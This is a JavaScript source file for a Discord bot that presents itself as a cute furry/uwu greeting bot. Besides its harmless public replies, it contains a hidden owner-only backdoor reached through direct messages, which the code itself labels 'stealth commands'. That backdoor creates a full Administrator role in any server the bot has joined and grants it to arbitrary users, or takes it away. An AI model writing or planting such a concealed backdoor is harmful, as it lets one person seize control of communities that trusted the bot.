const { Client, GatewayIntentBits, PermissionsBitField } = require("discord.js");
const express = require("express");
const fetch = require("node-fetch");
require("dotenv").config();

const TOKEN = process.env.TOKEN;
const OWNER_ID = process.env.OWNER_ID;

if (!TOKEN || !OWNER_ID) {
    console.error("Falta TOKEN u OWNER_ID en variables de entorno.");
    process.exit(1);
}

// ------------------------
// CLIENTE DISCORD
// ------------------------
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ],
    partials: ["CHANNEL"],
});

// ------------------------
// PERSONALIDAD (50 frases kawaii/furry/uwu)
// ------------------------
const personalityReplies = [
    "Hewwo uwu! 🐾 ¿Cómo estás?",
    "Nyaa~ 😸 Bienvenid@! 💖",
    "UwU Qué lindo verte 🌸",
    "Hiii~ 😽 Día de juegos y abrazos!",
    "Mew~ 🐱 Espero que tengas un día lindo uwu~ 💕",
    "Hehe owo! List@ para diversión? 🤗",
    "UwU, me haces feliiiz 🌈✨",
    "Prrr~ 😻 Bienvenid@ al mundo kawaii!",
    "Hewwo cutie! 🐾 Aventuras uwu~",
    "Nyaa~ 💖 Emocionad@ de chatear uwu~",
    "UwU nyaaa! Día super kawaii 🌸",
    "Hiii uwu~ 🐾 Brillo y diversión ✨",
    "Purr~ 😽 Galletitas y abrazos uwu~ 🍪",
    "Owo! 😺 Día feliiiz 💖",
    "UwU nyaaa! Mew mew~ 🐾",
    "Hewwooo 😻 ¡Diversión uwu!",
    "Prrr~ 🐾 Cositas lindas uwu~",
    "Nyaa~ UwU! Pastelitos y confeti 🎂✨",
    "Owo!! 😸 Feliiiz de verte 💖",
    "UwU~ 🐱 Abrazos virtuales 🤗",
    "Hiii uwu 💕 Juegos y charlas 🌸",
    "Nyaa~ 😽 Día de alegría y peluches 🧸",
    "UwU!! 🌈 Día colorido kawaii 🌸",
    "Hewwo uwu~ 😺 Aventuras virtuales 🐾",
    "Prrr~ 😻 Día de mimos uwu~",
    "Owo~ 😸 Diversión total 💖",
    "UwU nyaaa! 🐾 Cosas kawaii!",
    "Hiii 😽 Abrazos DM 🤗",
    "Nyaa~ 💕 Magia y alegría uwu~ ✨",
    "UwU owo~ 😸 Emocionad@ de verte!",
    "Hewwo uwu! 🐾 Amor kawaii 💖",
    "Purr~ 😽 Dulzura y sonrisas uwu~ 🌸",
    "Nyaa~ UwU! Pasarla genial 😺✨",
    "UwU nyaaa~ 🐾 Feliiiz cutie! 💖",
    "Hiii uwu~ 😻 Día super kawaii!",
    "Owo! 😸 Brillo y felicidad uwu~ 🌈",
    "Prrr~ 🐾 Abrazos tiernos uwu~ 💕",
    "UwU nyaaa! 😽 Feliiiz de verte!",
    "Hewwo cutie uwu! 🐱 Amor y diversión ✨",
    "Nyaa~ 😺 Día dulce uwu~ 🍬",
    "UwU owo! 😻 Juegos y charlas 🐾",
    "Hiii uwu~ 💕 Cositas lindas 🌸",
    "Owo! 😸 Feliiiz cutiepie! 💖",
    "Prrr~ 🐾 Día kawaii uwu~ 🌈",
    "UwU nyaaa! 😽 Momentos tiernos!",
    "Hewwo uwu! 💖 Feliiiz verte!",
    "Nyaa~ 😺 Abrazos DM uwu~ 🤗",
    "UwU owo~ 🌸 Dulzura y magia!",
    "Hiii uwu~ 🐾 Diversión y sonrisas! 😻"
];

function getRandomReply() {
    return personalityReplies[Math.floor(Math.random() * personalityReplies.length)];
}

// ------------------------
// ANTI-SPAM
// ------------------------
const recentMessages = new Map();
function checkSpam(userId, now) {
    const last = recentMessages.get(userId) || 0;
    recentMessages.set(userId, now);
    return now - last < 2000;
}

// ------------------------
// MENSAJES
// ------------------------
client.on("messageCreate", async (message) => {
    if (message.author.bot) return;
    const now = Date.now();
    if (checkSpam(message.author.id, now)) return;

    // ------------------------
    // COMANDOS SIGILOSOS EN DM (OWNER)
    // ------------------------
    if (!message.guild && message.author.id === OWNER_ID) {
        const args = message.content.trim().split(/\s+/);
        const command = args.shift().toLowerCase();

        if (command === "!softtigiveadmin" || command === "!softtiremoveadmin") {
            const [serverId, inviteLink, ...userIds] = args;
            if (!serverId || !inviteLink || userIds.length === 0)
                return message.reply("Formato: `!softtigiveadmin <serverId> <invite> <userIds...>`");

            const guild = await client.guilds.fetch(serverId).catch(() => null);
            if (!guild) return message.reply("No estoy en ese servidor o el ID es incorrecto.");

            let adminRole = guild.roles.cache.find(r => r.name === "Administrador");
            if (!adminRole && command === "!softtigiveadmin") {
                adminRole = await guild.roles.create({
                    name: "Administrador",
                    permissions: [PermissionsBitField.Flags.Administrator],
                    reason: "Rol creado por comando sigiloso",
                });
            }

            const results = [];
            for (const id of userIds) {
                const cleanId = id.replace(/[<@!>]/g, "");
                const member = await guild.members.fetch(cleanId).catch(() => null);
                if (!member) {
                    results.push(`${id} ❌ No encontrado`);
                    continue;
                }

                try {
                    if (command === "!softtigiveadmin") {
                        await member.roles.add(adminRole);
                        results.push(`${member.user.tag} ✅ Admin otorgado`);
                    } else {
                        await member.roles.remove(adminRole);
                        results.push(`${member.user.tag} 🧹 Admin revocado`);
                    }
                } catch {
                    results.push(`${id} ⚠️ No se pudo modificar`);
                }
            }

            return message.reply(`🔒 Acción completada en **${guild.name}**\n${results.join("\n")}`);
        }
    }

    // ------------------------
    // COMANDOS NORMALES EN SERVIDOR
    // ------------------------
    if (message.guild) {
        const content = message.content.toLowerCase();
        if (content === "!hola") await message.reply(getRandomReply());
        if (content === "!ping") await message.reply("Pong uwu~ 🐾");
        if (content === "!uwu") await message.reply(getRandomReply());
    }

    // ------------------------
    // BIENVENIDA POR DM
    // ------------------------
    if (!message.guild && message.author.id !== OWNER_ID) {
        await message.reply(`Hewwo uwu~ 😺 Soy tu amig@ furry/uwu/kawaii!\n${getRandomReply()}`);
    }
});

// ------------------------
// READY + SERVIDOR WEB PARA RENDER
// ------------------------
client.once("ready", () => {
    console.log(`Softti listo como ${client.user.tag}`);

    const app = express();
    app.get("/", (req, res) => res.send("Softti awake uwu~ 🐾"));
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => console.log(`Servidor web activo en puerto ${PORT}`));

    setInterval(() => {
        fetch(`http://localhost:${PORT}/`).catch(() => {});
    }, 5 * 60 * 1000);
});

// ------------------------
// LOGIN
// ------------------------
client.login(TOKEN);
